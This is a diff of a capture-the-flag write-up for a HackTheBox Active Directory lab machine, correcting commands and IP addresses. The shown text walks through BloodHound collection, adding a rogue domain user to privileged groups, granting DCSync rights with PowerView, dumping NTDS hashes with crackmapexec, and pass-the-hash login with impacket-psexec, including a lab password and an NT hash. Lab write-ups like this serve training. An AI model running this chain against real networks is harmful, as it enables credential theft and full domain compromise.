@@ -99,11 +99,11 @@ Credentials: `svc-alfresco:s3rvice`. WinRM is open on port 5985, so Evil-WinRM g
 
 ### BloodHound Analysis
 
-Run SharpHound to collect AD data:
+Run bloodhound-python to collect AD data:
 
 ```powershell
 bloodhound-python -d htb.local -u svc-alfresco -p s3rvice \
-  -gc forest.htb.local -c all -ns 10.129.135.139
+  -gc forest.htb.local -c all -ns 10.129.157.109
 ```
 
 BloodHound reveals the attack path:
@@ -125,7 +125,7 @@ Create a new domain user and add to the right groups:
 ```powershell
 net user mumu Mumu1804 /add /domain
 net localgroup "Remote Management Users" mumu /add
-net groups "Exchange Windows Permissions" mumu /add
+net group "Exchange Windows Permissions" mumu /add /domain
 ```
 
 Upload PowerView and grant DCSync privileges:
@@ -134,19 +134,19 @@ Upload PowerView and grant DCSync privileges:
 $pass = convertto-securestring 'Mumu1804' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential ('mumu', $pass)
 Add-DomainObjectAcl -PrincipalIdentity "htb\mumu" -Credential $cred \
-  -TargetIdentity "DC=htb, DC=local" -Rights DCSync
+  -TargetIdentity "DC=htb,DC=local" -Rights DCSync
 ```
 
 Dump the domain hashes:
 
 ```bash
-crackmapexec smb 10.129.111.242 -u 'mumu' -p 'Mumu1804' --ntds
+crackmapexec smb 10.129.157.109 -u 'mumu' -p 'Mumu1804' --ntds
 ```
 
 Pass-the-hash as Administrator:
 
 ```bash
-impacket-psexec htb.local/administrator@10.129.111.242 \
+impacket-psexec htb.local/administrator@10.129.157.109 \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
@@ -165,7 +165,7 @@ root.txt: [redacted]
 
 {{< callout type="note" >}}
 - Always check for AS-REP roastable accounts -- service accounts often have pre-auth disabled
-- BloodHound is essential for AD boxes; run SharpHound with credentials when you have them
+- BloodHound is essential for AD boxes; run bloodhound-python with credentials when you have them
 - `WriteDACL` on the domain object is a direct path to DCSync and full domain compromise
 - `Account Operators` membership is often overlooked but grants powerful group manipulation abilities
 {{< /callout >}}
